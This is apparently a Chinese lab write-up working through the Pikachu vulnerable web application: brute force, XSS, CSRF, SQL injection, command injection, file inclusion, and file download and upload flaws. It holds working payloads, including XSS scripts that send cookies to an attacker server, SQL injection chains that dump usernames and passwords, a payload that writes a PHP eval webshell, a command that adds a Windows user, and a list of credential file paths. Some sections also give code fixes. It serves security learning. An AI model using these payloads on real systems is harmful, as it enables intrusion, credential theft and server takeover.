---

typora-copy-images-to: 图片
typora-root-url: ./
---

# 一、暴力破解

Burte Force（暴力破解）概述

​             “暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。         

​             理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。这里的认证安全策略, 包括：

​              1.是否要求用户设置复杂的密码；
​             2.是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；
​             3.是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；
​             4.是否采用了双因素认证；
​             ...等等。

## 1、基于表单的暴力破解

a、提交数据

![1568213840918](/图片/1568213840918.png)

b、抓包进行爆破

![1568215095203](/图片/1568215095203.png)

![1568215114930](/图片/1568215114930.png)

c、看响应数据包长度

![1568215188316](/图片/1568215188316.png)

d、爆出密码为123456

![1568215234863](/图片/1568215234863.png)

## 2、验证码绕过(on server)

a、有些认证码机制造成浏览器提交数据后页面没刷新验证码就还在有效期中可以重复使用，使用bursuite拦截发送到repeater,多次发送请求相同的验证码果然可以重复使用。

![1568618135365](/图片/1568618135365.png)

b、使用发送到intruder添加paload进行爆破

![1568618273695](/图片/1568618273695.png)

![1568618313203](/图片/1568618313203.png)

3、爆破成功

![1568618412054](/图片/1568618412054.png)

## 3、验证码绕过(on client)

前端绕过是最不可靠的，使用bursuit抓包可以随意修改请求数据，绕过前端限制。

a、直接抓包，有了这个请求包后，验证码是可以不需要的

![1568618656858](/图片/1568618656858.png)

b、扔到intruder爆破：

![1568619024697](/图片/1568619024697.png)

![1568619012983](/图片/1568619012983.png)

c、爆出账户密码

![1568619093940](/图片/1568619093940.png)

## 4、token防爆破?

每次请求后token都是会改变的，这是否就意味着不可爆破？实际上我们是可以获取token的，把token加进paload进行密码爆破。

a、首先抓包扔到intruder，配置positions

![1568624869473](/图片/1568624869473.png)

b、点击Options,设置线程为1

![1568625168055](/图片/1568625168055.png)

添加Grep-Extract

![1568625201767](/图片/1568625201767.png)

指定token并复制下来，点击ok保存

![1568625270482](/图片/1568625270482.png)

![1568625405872](/图片/1568625405872.png)

redirections设置为always

![1568625419009](/图片/1568625419009.png)

c、接下来设置payloads

![1568625531546](/图片/1568625531546.png)

payload2为token,b把之前复制的token填入initial payload里面

![1568625574535](/图片/1568625574535.png)

d、开始爆破，爆破成功

![1568625717579](/图片/1568625717579.png)

# 二、Cross-Site Scripting

​		Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写"CSS"冲突，故又称XSS。一般XSS可以分为如下几种常见类型：
​         1.反射性XSS;
​          2.存储型XSS;
​          3.DOM型XSS;
​          XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。
​            因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:
​            输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;
​            输出转义：根据输出点的位置对输出到前端的内容进行适当转义。
​          对于过滤，我们会通过各种方法去绕过:

​           前端过滤绕过：抓包拦截改包

​           大小写绕过：<ScipT>alert(/xss/)</SCipt>

​            双写绕过：<scr<script>ipt>alert(/xss/)</s</script>cript>

​            注释干扰：<sc<!--content-->ript>alert(/xss/)</scr<!--content-->ipt>

​            编码绕过：依据前端编码解码机制

## 1、反射型xss(get)



### 1）漏洞验证：

页面只有一个输入框并设置了长度限制，随便输入一个字符，并在页面上返回字符，在message参数直接提交payload:<script>alert(1)</script>。

![1568704670690](/图片/1568704670690.png)

其他一些有趣的payload:

<a href=""  onclick=alert("xss")>type<a>
<img src='' onerror=alert("xss")>

<script>window.location='http://1.1.1.1'</script＞
<script>document.location.href="http://www.evil.com"</script>
<iframe src="http://1.1.1.1/victim" height = "0" width = "0"></iframe>
<srcipt>new.Image.src="192.168.1.104/c.php?output="+document.cookie</script>
<script>document.body.innerHTML="<div stytle=visibility:visible;><h1>THIS WEBSITE IS UNDER ATTACK</h1>"</script>
### 2）漏洞利用

#### a、窃取cookie

首先你得有个服务器，在服务器根目录下新建一个a.js脚本：

var img = new Image()
img.src = "http://你的服务器ip/cookies.php?cookie="+document.cookie;

然后通过xss诱导受害者访问你这个a.js，paload为<script src="http://你的ip/a.js"></script>,如果被访问到，你就可以在服务日志获取到受害者的cookie。

![1569133272540](/图片/1569133272540.png)

![1569133321734](/图片/1569133321734.png)

### 3）代码分析

服务器获取用户通过get提交过来的message,没有过滤就通过字符串拼接赋值给html，并且没有做任何编码处理就打印出来。

![1568717795251](/../../../hacker%20book/blog/pikachu/%E5%9B%BE%E7%89%87/1568717795251.png)

![1568717963826](/../../../hacker%20book/blog/pikachu/%E5%9B%BE%E7%89%87/1568717963826.png)

### 4）代码修复

使用htmlspecialchars将特殊字符转换成html实体：

![1569134982192](/图片/1569134982192.png)

修复后再攻击发现无法实现弹框，并且paload被编码成html实体

![1569135036924](/图片/1569135036924.png)

![1569135164026](/图片/1569135164026.png)

## 2、反射型xss(post)

这里的反射型xss(post)跟get的都是一样的，只是请求方式不一样，所以也不废话那么多。

### 1）漏洞验证

这里要先登录

![1569136278832](/图片/1569136278832.png)

然后输入paloads，验证成功

![1569136374273](/图片/1569136374273.png)



## 3、存储型xss

​        攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。这就意味着只要访问了这个页面的访客，都有可能会执行这段恶意脚本，因此储存型XSS的危害会更大。因为存储型XSS的代码存在于网页的代码中，可以说是永久型的。它一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。

###       1）漏洞验证

直接在留言板上提交恶意代码发现，访问页面直接执行了恶意代码

![1569154820234](/图片/1569154820234.png)       

### 2）代码分析

不做任何过滤直接写入数据库

![1569225158281](/图片/1569225158281.png)

不做实体编码直接输出到前端页面上

![1569225377407](/图片/1569225377407.png)

### 3）代码修复

![1569225629901](/图片/1569225629901.png)

## 4、DOM型xss

DOM xss是基于dom文件对象模型的，前端脚本通过dom动态修改页面，由于不予服务端运行交互，而且代码是可见的，从前端获取dom中的数据在本地执行。常见的可以操作的dom对象有：url、location、referrer等。dom型的xss比较特殊，是一种基于dom树的xss，服务器端经常使用document.body.innertHtml等动态函数生成HTML页面，如果这些函数在引用某些变量时没有进行过滤检查，就会产生dom型的xss。dom型的xss可能是存储型的也可能是反射性的。

### 1）漏洞验证

碰到一个输入框一般情况下，我会直接输入几个字符，然后查看源代码，查看出现在哪个地方

![1569228526687](/图片/1569228526687.png)

![1569228544012](/图片/1569228544012.png)

并没有发现输入的字符串，然后就考虑dom型的xss，提交输入的内容后有个what do you see,然后在源代码发现了这个![1569228933416](/图片/1569228933416.png)

输入的内容嵌入到a标签里面，我们闭合掉引号形成paload。

![1569229377388](/图片/1569229377388.png)

![1569229105926](/图片/1569229105926.png)

### 2）代码分析

DOM型的xss恶意代码没有经过服务器器，是直接经过js处理的。

![1569291505129](/图片/1569291505129.png)

### 3）代码修复

xss修复一般想到的是转义，转义一般比过滤更加可靠，在php中有现成的htmlspecialchars函数对字符串进行转义，而js似乎没有有现成的函数进行转义，尝试使用正则表达式编写一个转义函数实现转义。

![1569293570398](/图片/1569293570398.png)

## 5、DOM型xss-x

打开页面查看源代码，操作基本跟上节差不多

![1569294676460](/图片/1569294676460.png)

先输入paload：' onclick="alert(1)"，点击[有些费尽心机想要忘记的事情,后来真的就忘掉了]，再点击[就让往事都随风,都随风吧]

![1569294731611](/图片/1569294731611.png)

## 6、xss之盲打

如何称之盲打，是因为你无法在攻击页面确认是否攻击成功，从这页面中看是提交看法建议的页面，提交的数据很可能会在后台显示。

![1569295586317](/图片/1569295586317.png)

![1569295634384](/图片/1569295634384.png)

### 1）代码分析

不做任何过滤

![1569295747591](/图片/1569295747591.png)

不做任何转义的输出

![1569295952713](/图片/1569295952713.png)

## 7、xss之过滤

### 1）漏洞验证

正常输入<script>alert(1)</script>发现被过滤掉了，只剩一个'>',难道其他字符全被过滤掉了？尝试单输入<,发现又没有被吃掉，猜想过滤的不是特定字符，而是某些符合规则的字符串组合。尝试大小写绕过，<Script>alert(1)</Script>，发现攻击成功，后来我发下<img src="" onerror="alert(1)">这个 也是可以绕过的，这个过滤是搞笑的吧，看下源码。

![1569296673960](/图片/1569296673960.png)

### 2）源码分析

发现是一个简单的正则过滤，怪不得<img src="" onerror="alert(1)">直接可以 绕过。

![1569296855976](/图片/1569296855976.png)

## 8、xss之htmlspecialchars

之前以为转义是很安全的，现在发现转义后不一定会完全不存在xss漏洞，比如单引号没有被转义，在一定情况下是会存在xss漏洞的。

### 1）漏洞验证

这里使用单引号即可绕过转义：' onclick='alert(1)'

![1569304906691](/图片/1569304906691.png)

### 2）代码分析

这里html转义后字符串结合a标签输出到html页面上，这时利用单引号没有被转义实现攻击。加上ENT_QUOTES参数可以对单引号进行转义，htmlspecialchars($_GET['message'],ENT_QUOTES)

![1569305212126](/图片/1569305212126.png)

## 9、xss之href输出

### 1）漏洞验证

打开页面尝试攻击，发现特殊字符全部被转义，包括单引号，估计使用了htmlspecialchars($_GET['message'],ENT_QUOTES)。但看源代码发现输入内容被输出到a标签的herf属性中。意味着可以尝试伪协议绕过javascript:alert(1)。

![1569306640860](/图片/1569306640860.png)

### 2）代码分析

虽然做了彻底的转义，但输出在a标签的herf中，没有做协议的过滤。

![1569306728168](/图片/1569306728168.png)

### 3）代码修复

设置href只允许http,https协议。

![1569307505399](/图片/1569307505399.png)

## 10、xss之js输出

### 1）漏洞验证

打开页面输入数据，查看源代码，发现在js里面出现，然后构造正确的语法就可以实现攻击了，paload:  ';alert(1);$a='

![1569307889422](/图片/1569307889422.png)

### 2）代码分析

php获取message并赋值给jsvar，然后输出到页面的js中

![1569308314825](/图片/1569308314825.png)

![1569308028645](/图片/1569308028645.png)

### 3）代码修复

这里讲输入动态的生成到了js中,形成xss，javascript里面是不会对tag和字符实体进行解释的,所以需要进行js转义，这里如果进行html的实体编码,虽然可以解决XSS的问题,但是实体编码后的内容,在JS里面不会进行翻译,这样会导致前端的功能无法使用。所以在JS的输出点应该使用\对特殊字符进行转义。

## 11、总结

对于xss的防范总的来说从两个方面来考虑，输入进行过滤和输出进行转义。

在这里只是介绍各种情况的xss和修复，并没有介绍很深各种过waf姿势，只有8和9有点意思，在之后完成这个教程会单独把xss拿出来研究各种绕过。

# 三、CSRF

Cross-site request forgery 简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为"one
click"攻击。网站如果要防止CSRF攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致CSRF。比如：
--对敏感信息的操作增加安全的token；
--对敏感信息的操作增加安全的验证码；
--对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。

## 1、CSRF(get)

### 1）漏洞验证

首先使用用户登录，修改个人信息，提交抓包发现，是以get方式提交的并且与提交的数据一样，这个操作很可能没有做任何保护。

![1569326032807](/图片/1569326032807.png)

![1569326124173](/图片/1569326124173.png)

burpsuit里面有一个csrf的利用模块，右击要利用的链接选择CSRF Poc，就会生成一个利用的页面，把这个页面的的链接发给其他用户，如果其他用户在浏览器的cookie还有效的话就会执行这个操作。

![1569326500749](/图片/1569326500749.png)

![1569326544860](/图片/1569326544860.png)

我们登陆个用户，查看信息

![1569326687763](/图片/1569326687763.png)

访问http://127.0.0.1:8080/show/72/o88nuxcojwghvotyhikk7nlzd7lql66l这个poc页面

点击提交：

![1569326830941](/图片/1569326830941.png)

发现kobe的信息被改。

![1569326782564](/图片/1569326782564.png)

## 2、CSRF(post)

post型的操作跟get的也差不多，废话就不多说了

## 3、CSRF Token

  同样的操作发现无法修改，原因是提交的数据带有token.

![1569327494379](/图片/1569327494379.png)

点击修改个人信息按钮后，服务器会返回一个个人信息的表单页面。表单会嵌入一个隐藏的`<input />`标签，标签的`value`属性值为服务器端生成并存储在Session中的token，表单数据被提交时，token也会被提交到服务器。当填好个人信息的表单，点击提交后，服务器不仅检查信息是否有空值，还会将表单提交过来的token值也Session中的token值作对比，对比不通过不会执行个人信息修改操作。

![1569327619214](/图片/1569327619214.png)

![1569327671543](/图片/1569327671543.png)

## 4、总结

scrf防御思路：

1）验证码：对某些重要的操作，使用验证码验证，验证码一方面避免了身份认证信息在不知情的情况下被使用（因为与服务器有交互），另一方面攻击者在不知道验证码参数的值也无法完成攻击。缺点是用户体验有点差。

2）Referer Check：在HTTP请求消息头中有一个`Referer`头部，该头部的值记录着是从哪个页面（URL）跳转过来的。检查Referer也起到一定的作用，缺点是服务器不是任何时候都能获取的`Referer`的值，有时候出于安全考虑，限制了`Referer`的发送。

3）Token：Token是一串足够长且复杂的随机数，Token防御CSRF的本质就是让请求参数不可被预测，不能被预测也就意味着攻击者不能构造出恶意数据包请求。

# 四、Sql Inject(SQL注入)

SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：
        1.对传进SQL语句里面的变量进行过滤，不允许危险字符传入；
        2.使用参数化（Parameterized Query 或 Parameterized Statement）；
        3.还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了"拼接"的方式,所以使用时需要慎重!                     

## 1、数字型注入

抓包发现是post请求

![1569380321684](/图片/1569380321684.png)

把post提交的数据复制出来，使用hackbar发送数据：

![1569380818778](/图片/1569380818778.png)

给参数1加个单引号，报错说明此处存在注入，接下来输入id=1 and 1=1返回正确，id=1 and 1=2返回user id不存在，说明这是一个数字型注入。

![1569381193053](/图片/1569381193053.png)

使用order by判断列数，id=1 order by 2访问正常，id=1 order by 3报错，说明列数为2，接下来使用联合查询，id=1 union select 1,2爆出数据的位置，接下来可以做各种数据库的查询。

![1569382000133](/图片/1569382000133.png)

查询操作系统版本、mysql安装路径、mysql版本、当前数据库用户、数据库路径、当前数据库名、能否导出文件：

id=1 union select 1,concat_ws('，',@@version_compile_os,@@basedir,version(),user(),@@datadir,database(),@@secure_file_priv)

mysql中自带一个information_schema，记录着所有数据库的信息。

查询所有数据库：

id=1 union select 1,(select group_concat(schema_name) from information_schema.schemata)

查询pikachu数据库的表

id=1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='pikachu')

查询users表里面的字段

id=1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='pikachu')

查询username和password的记录：

id=1 union select 1,(select group_concat(username,':',password) from pikachu.users)

拿到用户名密码。

## 2、字符型注入

打开页面，输入数据：参数name=1'报错，name=1' and '1'='1正常，name=1' and 1=1报错，从而证明这是一个字符型注入。

字符型跟整形的区别不大，只要注意引号的闭合就好了，注入方式跟上面一样。

name=1' union select 1,concat_ws('，',@@version_compile_os,@@basedir,version(),user(),@@datadir,database(),@@secure_file_priv)-- 

![1569408183114](/图片/1569408183114.png)

由于上面的已经讲了如何进行利用infomation_schema,这里就不重复了，我们发现以上查询中secure_file_priv为空值，那我们就来探究一下这个mysql文件读写问题吧。

### 1）secure_file_priv

secure_file_priv是控制mysql是否有读写的权限，它的值有三种：

​		a、secure_file_priv为null    表示不允许导入导出

​		b、secure_file_priv指定文件夹时，表示mysql的导入导出只能发生在指定的文件夹

​		c、secure_file_priv没有设置时，则表示没有任何限制

在mysql.ini文件里面可以修改。

### 2）load_file()、load data infile、into outfile

load_file()：导出文件

load data infile ：文件导入到数据库

into outfile：导入到文件

只有secure_file_priv为空值是这三个函数才有权限操作。

### 3）读取文件

name=1' union select 1,(load_file("D:/1.txt"))-- 

![1569465838334](/图片/1569465838334.png)

![1569465817909](/图片/1569465817909.png)

### 4）写入木马

name=1' union select 1,<?php eval($_POST['pass']);?> into outfile "D:/1.php"--%20

这里的<?php eval($_POST['pass']);?>一定要编码，不然语句一定会报错，因为里面有顿号，mysql就会认为到顿号就是一个完整的语句。所以最后的payload为：

name=1' union select 1,CHAR(60, 63, 112, 104, 112, 32, 101, 118, 97, 108, 40, 36, 95, 80, 79, 83, 84, 91, 39, 112, 97, 115, 115, 39, 93, 41, 59, 63, 62) into outfile "../../WWW/1.php"-- 。我这里使用的是phpstudy搭建的环境，所以使用对目录结构，所以使用相对路径上传，并猜测位置使用菜刀连接。

不过不知道为什么前面会出现一连串的1。

![1569468926529](/图片/1569468926529.png)

![1569469902692](/图片/1569469902692.png)

![1569469954140](/图片/1569469954140.png)

连接成功。

## 3、搜索型注入

看到搜索型注入，搜索语句一般都是模糊搜索，其语法结构一般是这样子的 ：select * from xx where name like '%$name%'。所以在注入的时候注意闭合%‘即可。

输入单引号报错，判断存在注入，而且提示实在%附近，没有闭合![1569476998966](/图片/1569476998966.png)

输入name=1%'-- ，数据返回正常，结果与name=1一致，说明payload已经拼接了；

name=1%' order by 3 -- 正常 name=1%' order by 4 -- 报错，说明列数为3。接下来不多说，攻击方法跟之前的一样。

## 4、xx型注入

直接上单引号

![1569828201205](/图片/1569828201205.png)

上单引号加并注释掉后面的内容发现

![1569828309324](/图片/1569828309324.png)

说明单单使用单引号的闭合不了语句，还有其他符号，我们发现第一个提示中有个括号，很大可能这个闭合与括号有关

使用：1')-- ，发现成功

![1569828471538](/图片/1569828471538.png)

## 5、"insert/update/delete"注入

​	   之前的注入都是基于select查询语句来注射的，这里将介绍一个基于insert/update/delete语句的注射。

### 1）注释语法 

​      这里使用显错模式 ,思路是在语句中构造语法错误，利用语句是如下

```sql
insert into users (id, username, password) values (2,''inject here'','Olivia');
insert into users (id, username, password) values (2,""inject here"",'Olivia');
```

### 2）updatexml()获取数据

updatexml()函数是mysql对xml文档数据进行查询和修改的XPATH函数。

payload：
or updatexml(1,concat(0x7e,(version())),0) or 

a 、insert:

闭合引号

' or updatexml(1,concat(0x7e,(version())),0) or '

![1570520897542](/图片/1570520897542.png)

![1570520845180](/图片/1570520845180.png)

b、update：

payload 和insert的一样都是' or updatexml(1,concat(0x7e,(version())),0) or '

![1570521128900](/图片/1570521128900.png)

c、delete:

id=13964 or updatexml(1,concat(0x7e,(version())),0) or ‘’

![1570520664551](/图片/1570520664551.png)

这三个操作基本一样接下来只展示update获取数据

获取当前数据库的所有表名：

 `or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),0) or` 

获取当前数据库users表的所有列名：

 `or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database())),0) or`

获取users表的username,password列的数据

`or updatexml(1,concat(0x7e,(select group_concat(username,' : ',password) from pikachu.users )),0) or` 



### 3）extractvalue()获取数据

payload：

```
or extractvalue(1,concat(0x7e,database())) or
```

### 4）name_const()获取数据

Payload：

```
or (SELECT * FROM (SELECT(name_const(version(),1)),name_const(version(),1))a) or
```

### 5）利用子查询注入

payload

```
or (SELECT 1 FROM(SELECT count(*),concat((SELECT (SELECT concat(0x7e,0x27,cast(database() as char),0x27,0x7e)) FROM information_schema.tables limit 0,1),floor(rand(0)*2))x FROM information_schema.columns group by x)a) or
```

### 6）更多闭合变种

```
' or (payload) or '
' and (payload) and '
' or (payload) and '
' or (payload) and '='
'* (payload) *'
' or (payload) and '
" – (payload) – "
```

### 7）引用

http://www.vuln.cn/6772

## 6、http头注入

### 1）常见的http头部注入参数

User-Agent:识别客户使用的操作系统，游览器版本等

Cookie:网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据

X-Forwarded-For:HTTP的请求端真实的IP

Client-IP:同上

Host:客户端访问的web服务器域名/ip地址和端口号

。。。。。。

### 2）insert型注入http头

由于这里的sql语句如下是insert型http头部注入

```php
$query="insert httpinfo(userid,ipaddress,useragent,httpaccept,remoteport) values('$is_login_id','$remoteipadd','$useragent','$httpaccept','$remoteport')";
$result=execute($link, $query);
```

所以使用工具hackerbar对user-agent注入

payload：1' or updatexml(1,concat(0x7e,(version())),0) or'

![1570601568107](/图片/1570601568107.png)

## 7、基于boolean的盲注

盲注：在某些情况下后台对报错信息进行屏蔽，此时无法再根据信息来判断注入，这种情况下的注入称为盲注，盲注又分为基于布尔型盲注和基于时间的盲注。

基于boolean的盲注主要表现症状：
①没有报错信息
②不管是正确的输入，还是错误的输入，都只显示两种情况（我们可以认为是1或者0）
③在正确的输入下，输入and 1=1/and 1=2可以发现判断



接下来打开靶机，发现熟悉的输入框，输入单引号显示username不存在，输入其他字符同样提示不存在

![1570605131579](/图片/1570605131579.png)

这里面是有点奇葩的，只有输入存在的用户名才会显示一下信息。其中一个存在的用户名是kobe,所以接下来的注入得依赖这个用户名。

![1570605599135](/图片/1570605599135.png)

接下来我输入kobe'-- 显示username不存在 

输入kobe' and 1=1-- 显示了用户id和email

输入kobe' and 1=2-- 显示username不存在 

到这里我们就可以判断存在盲注了。

其实，在这里我思考可不可以不依赖存在的用户，我考虑使用异或 false xor true 为true来绕过，

比如： a' xor 1=1-- ，不存在用户a所以为假，1=1为真，假异或真为真。结果是自己的痴心妄想hh,然后好奇看了源码发现还有一个判断。

![1570615391934](/图片/1570615391934.png)



### 1）猜库名

库名长度：kobe' and length(database())>1-- 

我们可以使用burpsuit半自动化工具去跑，长度结果为7

![1570612179146](/图片/1570612179146.png)

![1570612293430](/图片/1570612293430.png)

![1570611873375](/图片/1570611873375.png)

猜库名，kobe'and (ascii(substr(database(),1,1))>112)-- 得出ascci码为：112，105，107，97，99，104，117转化为字符串pikachu

![1570612563864](/图片/1570612563864.png)

### 2）猜表名

kobe'and (ascii(substr(concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1,1))>1)-- 

![1570619744910](/图片/1570619744910.png)

得到

126  104  116   116   112  105  110  102  111 ...............

~httpinfo,member,message,users,x

### 3）猜列名

kobe'and (ascii(substr(concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database())),1,1))>1)-- 

### 4)猜记录

kobe'and (ascii(substr(concat(0x7e,(select group_concat(username,' : ',password) from pikachu.users )),1,1))>1)-- 

盲注手工操作真的是繁琐，要崩溃了qaq。

## 8、基于时间的盲注

## 9、宽字节注入

# 五、RCE

RCE(remote command/code execute)概述

RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。                     

**远程系统命令执行**
 一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口,比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上，一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。而如果设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器，现在很多的甲方企业都开始实施自动化运维,大量的系统操作会通过"自动化运维平台"进行操作。                         在这种平台上往往会出现远程系统命令执行的漏洞,不信的话现在就可以找你们运维部的系统测试一下,会有意想不到的"收获"-_-                     

**远程代码执行**
同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。 

因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。           

## 1、exec "ping"

在命令执行漏洞中我们可以尝试&、&&、|、||、;等符号拼接执行命令。

输入127.0.0.1|ipconfig

![1570676476964](/图片/1570676476964.png)

输入127.0.0.1 | net user hack 123 /add,可添加用户。

源码中直接拼接语句

![1570676899733](/图片/1570676899733.png)

## 2、exec "eval"

输入phpinfo();

![1570676621703](/图片/1570676621703.png)

源码中eval()处理字符串里面的表达式

`if(isset($_POST['submit']) && $_POST['txt'] != null){`

​    `if(@!eval($_POST['txt'])){`

​        `$html.="<p>你喜欢的字符还挺奇怪的!</p>";`



# 六、File Inclusion

File Inclusion(文件包含漏洞)概述

文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。比如 在PHP中，提供了：

<u>include(),include_once()</u>
<u>require(),require_once()</u>
这些文件包含函数，这些函数在代码设计中被经常使用到。
 大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。                         根据不同的配置环境，文件包含漏洞分为如下两种情况：
**1.本地文件包含漏洞：**仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。
 **2.远程文件包含漏洞：**能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。

因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。                             

## 1、本地文件包含

首先随意提交一个下拉菜单的选项，观察url,发现包含一个文件名，很可能存在一个文件包含漏洞。

![1570678070307](/图片/1570678070307.png)

在根目录下新建一个<?php phpinfo(); ?>的1.php文件。

输入../../../../../../../.././1.php提交发现文件被执行。

![1570678436215](/图片/1570678436215.png)

**常见的敏感信息路径：**

Windows系统

> c:\boot.ini // 查看系统版本
>
> c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件
>
> c:\windows\repair\sam // 存储Windows系统初次安装的密码
>
> c:\ProgramFiles\mysql\my.ini // MySQL配置
>
> c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码
>
> c:\windows\php.ini // php 配置信息

Linux/Unix系统

> /etc/passwd // 账户信息
>
> /etc/shadow // 账户密码文件
>
> /usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件
>
> /usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置
>
> /usr/local/app/php5/lib/php.ini // PHP相关配置
>
> /etc/httpd/conf/httpd.conf // Apache配置文件
>
> /etc/my.conf // mysql 配置文件

## 2、远程文件包含

PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include/require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。

allow_url_fopen = On：是否允许打开远程文件

allow_url_include = On：是否允许include/require远程文件

?filename=http://www.baidu.com&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2

![1570679816067](/图片/1570679816067.png)



# 七、unsafe filedownload

文件下载功能在很多web系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如../../../etc/passwd),则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等)被下载。 所以，在设计文件下载功能时，如果下载的目标文件是由前端传进来的，则一定要对传进来的文件进行安全考虑。 切记：所有与前端交互的数据都是不安全的，不能掉以轻心！                     



设置抓包点击名字的下载链接，

![1570689300428](/图片/1570689300428.png)

修改文件名为../../../../../../../1.php

![1570689429124](/图片/1570689429124.png)

![1570689491571](/图片/1570689491571.png)

下载成功。

# 八、unsafe upfileupload

文件上传功能在web应用系统很常见，比如很多网站注册的时候需要上传头像、上传附件等等。当用户点击上传按钮后，后台会对上传的文件进行判断比如是否是指定的类型、后缀名、大小等等，然后将其按照设计的格式进行重命名后存储在指定的目录。如果说后台对上传的文件没有进行任何的安全判断或者判断条件不够严谨，则攻击着可能会上传一些恶意的文件，比如一句话木马，从而导致后台服务器被webshell。                     

所以，在设计文件上传功能时，一定要对传进来的文件进行严格的安全考虑。比如：
 --验证文件类型、后缀名、大小;
--验证文件的上传方式;
 --对文件进行一定复杂的重命名;
--不要暴露文件上传后的路径;
--等等...

## 1、客户端check

![1570693595585](/图片/1570693595585.png)

这里的上传是通过前端判断文件后缀名来区别是否为图片。

上传前把木马文件后缀名改为jpg格式，上传拦截抓包，然后修改文件后缀名发送

![1570690681606](/图片/1570690681606.png)

![1570690791710](/图片/1570690791710.png)

接下来可以使用菜刀连接了。

![1570699659889](/图片/1570699659889.png)

## 2、服务端check

MIME type检测是检测Content-type,上传1.php,抓包，将Content-type的内容改为image/jpeg。上传成功，返回路径。

![1570702641129](/图片/1570702641129.png)

## 3、getimagesize()



![1570703871101](/图片/1570703871101.png)







